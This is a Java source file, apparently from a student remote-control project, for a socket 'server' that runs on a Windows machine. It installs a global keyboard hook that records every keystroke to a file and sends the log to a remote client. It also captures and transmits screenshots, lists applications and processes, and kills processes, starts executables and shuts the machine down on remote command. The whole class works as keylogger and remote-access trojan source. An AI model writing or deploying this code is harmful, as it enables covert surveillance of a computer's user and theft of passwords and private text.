/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package Server;

import java.awt.AWTException;
import java.awt.HeadlessException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.*;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import javax.imageio.ImageIO;
import java.util.Scanner;

import Common.*;

/**
 *
 * @author pgb
 */
public class server implements NativeKeyListener {
    
    private static String string = "";
    
    public static String rec() throws IOException{
        Program.server = Program.serverSocket.accept();
        InputStreamReader in = null;
        try {
            in = new InputStreamReader(Program.server.getInputStream());
        } catch (IOException ex) {
            
        }
        BufferedReader bf = new BufferedReader(in); 
        String signal = null;
        try {
            signal = bf.readLine();
        } catch (IOException ex) {
            signal = "QUIT";
        }
        Program.server.close();
        return signal;
    }
    
    public static void main(String[] args) throws IOException, NativeHookException, InterruptedException {
      
    }
    
    public static void shutdown() throws IOException {
        String Shutdown = "shutdown -s -t 30";
        Process run = Runtime.getRuntime().exec(Shutdown);
    }
    
    public static void screenshot() throws IOException {
        try {
            
            Robot robot = new Robot();
            Rectangle rect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            OutputStream os = Program.server.getOutputStream();
            BufferedOutputStream bfs = new BufferedOutputStream(os);  
            BufferedImage myImage = robot.createScreenCapture(rect);       
            ImageIO.write(myImage, "png", os);
        } catch (AWTException | HeadlessException e) {
            e.printStackTrace();
        } finally {
  
        }
    }

    public static void hook() {
        File folder = new File("C:\\Keylog");
        if(!folder.exists()){
            if(folder.mkdir()){
                try {
                    File file = new File("C:\\keylog\\key.txt");
                    file.createNewFile();
                } catch (IOException ex) {
                    ex.printStackTrace();
                }
            }
        }   
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
        GlobalScreen.addNativeKeyListener(new server());    
    }
    
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {     
        String temp = "";
        temp = NativeKeyEvent.getKeyText(e.getKeyCode()).toLowerCase();
        switch (temp) {
            case "space":
                temp = temp.replace("space", " ");
                break;
            case "enter":
                temp = temp.replace("enter", "\n");
                break;
            case "open bracket":
                temp = temp.replace("open bracket", "[");
                break;
            case "close bracket":
                temp = temp.replace("close bracket", "]");
                break;
            case "back slash":
                temp = temp.replace("back slash", "\\");
                break;
            case "semicolon":
                temp = temp.replace("semicolon", ";");
                break;
            case "quote":
                temp = temp.replace("quote", "'");
                break;
            case "coma":
                temp = temp.replace("coma", ",");
                break;
            case "period":
                temp = temp.replace("period", ".");
                break;
            case "dead acute":
                temp = temp.replace("dead acute", "/");
                break;
            case "back quote":
                temp = temp.replace("back quote", "`");
                break;
                
            default:
                break;
        }
        string += temp;
    }
    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        
    }
    
    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        
    }
    
    public static void unhook() throws NativeHookException {
        GlobalScreen.unregisterNativeHook();
    }
    
    public static void printKey() throws FileNotFoundException, IOException {
        FileWriter fw = new FileWriter("C:\\keylog\\key.txt");
        fw.write(string);
        fw.flush();
        string = "";
        FileReader fr = new FileReader("C:\\keylog\\key.txt");
        BufferedReader bf = new BufferedReader(fr);  
        String mess = "";        
        while(bf.ready()) {
            mess += ((char)bf.read());
        }        
        PrintWriter pr = new PrintWriter(Program.server.getOutputStream());
        pr.println(mess);
        pr.flush();
    }
    
    public static void viewApp() throws IOException, InterruptedException {
        File folder = new File("C:\\ListApp");
        if(!folder.exists()){
            if(folder.mkdir()){
                try {
                    File file = new File("C:\\ListApp\\listApp.txt");
                    file.createNewFile();
                } catch (IOException ex) {
                    ex.printStackTrace();
                }
            }
        }      
        FileOutputStream fout = new FileOutputStream("C:\\ListApp\\listApp.txt");
        BufferedOutputStream bout = new BufferedOutputStream(fout);
        Process proc = new ProcessBuilder("powershell","\"gps| ? {$_.mainwindowtitle.length -ne 0} | Format-Table -HideTableHeaders  name, ID").start();
            new Thread(() -> {
                Scanner sc = new Scanner(proc.getInputStream());
                if (sc.hasNextLine()) sc.nextLine();
                while (sc.hasNextLine()) {
                    String line = sc.nextLine();
                    line += "\n";
                    byte b[] = line.getBytes();
                    try {
                        bout.write(b);
                        bout.flush();
                    } catch (IOException ex) {
                        ex.printStackTrace();
                    }
                }
        }).start();
        proc.waitFor();
        FileReader fr = new FileReader("C:\\ListApp\\listApp.txt");
        BufferedReader br = new BufferedReader(fr);
        String mess = br.readLine();
        while(mess != null){
            PrintWriter pr = new PrintWriter(Program.server.getOutputStream());
            pr.println(mess);
            pr.flush();
            mess = br.readLine();
        }
    }
    
    public static void kill() throws IOException {
        String id = rec();
        String cmd = "taskkill /F /PID " + id;
        Runtime.getRuntime().exec(cmd);
    }
    
    public static void start() throws IOException {
        String app = rec() + ".exe";
        ProcessBuilder builder = new ProcessBuilder(app);
        Process process = builder.start();
    }
    
    public static void viewProcess() throws IOException, InterruptedException {
       File folder = new File("C:\\Process");
        if(!folder.exists()){
            if(folder.mkdir()){
                try {
                    File file = new File("C:\\Process\\process.txt");
                    file.createNewFile();
                } catch (IOException ex) {
                    ex.printStackTrace();
                }
            }
        }      
        FileOutputStream fout = new FileOutputStream("C:\\Process\\process.txt");
        BufferedOutputStream bout = new BufferedOutputStream(fout);
        Process proc = new ProcessBuilder("tasklist.exe", "/fo", "csv", "/nh").start();
            new Thread(() -> {
                Scanner sc = new Scanner(proc.getInputStream());
                if (sc.hasNextLine()) 
                    sc.nextLine();
                while (sc.hasNextLine()) {
                    String line = sc.nextLine();
                    String [] parts = line.split(",");
                    String unq = parts[0].substring(1).replaceFirst(".$","");
                    String pid = parts[1].substring(1).replaceFirst(".$","");
                    String str = unq + " " + pid + "\n";
                    byte b[] = str.getBytes();
                    try {
                        bout.write(b);
                        bout.flush();
                    } catch (IOException ex) {
                    }                  
                }
            }).start();
        proc.waitFor();
        FileReader fr = new FileReader("C:\\Process\\process.txt");
        BufferedReader bf = new BufferedReader(fr);  
        String mess = bf.readLine();        
        while(mess != null) {
            PrintWriter pr = new PrintWriter(Program.server.getOutputStream());
            pr.println(mess);
            pr.flush();
            mess = bf.readLine();
        }        
    }
}
